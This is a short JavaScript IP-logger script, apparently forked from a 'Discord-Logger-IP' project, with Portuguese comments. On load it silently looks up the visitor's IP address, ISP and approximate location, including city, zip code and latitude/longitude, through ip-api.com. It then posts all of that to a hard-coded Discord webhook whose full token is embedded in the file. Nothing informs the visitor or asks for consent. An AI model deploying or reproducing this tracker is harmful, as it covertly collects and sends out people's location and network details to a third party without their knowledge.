// Cole sua URL da API do Discord Webhook na Linha 3: WEBHOOKURL => SUA URL da API

var webHookUrl = "https://discord.com/api/webhooks/1038286114248720494/xZVBBh6rS5A3Py6RYSRgI5Tgidjg1e1vESUsjOfPv1mNx0iSl05n_TxU2WwMZtCAOVMv";

/*
    Bifurcado de: https://github.com/Saddam171/Discord-Logger-IP
    License: MIT
*/

const request = async () => { // Chamando uma busca "síncrona"
    const response = await fetch('https://ip-api.com/json/');
    const data = await response.json();

    // Declarando variáveis
    var ip = data.query;

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.countryCode.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.zip;
    var lat = data.lat;
    var lon = data.lon;

    //Abrir solicitação POST
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
                    + "`" + ip + "`" + 
                    "\n \n__**:telephone: Provider:**__ \n" 
                    + provider + 
                    "\n \n__**:map: Timezone:**__ \n" 
                    + timezone + 
                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
                    + country + " - " + region + 
                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
                    + zip + " " + city +
                    "\n \n__**:round_pushpin: Location:**__ \n" 
                    + "**Longitude:** " + lon + "\n"
                    + "**Latitude:** " + lat
    }

    postRequest.send(JSON.stringify(params));

}

request();

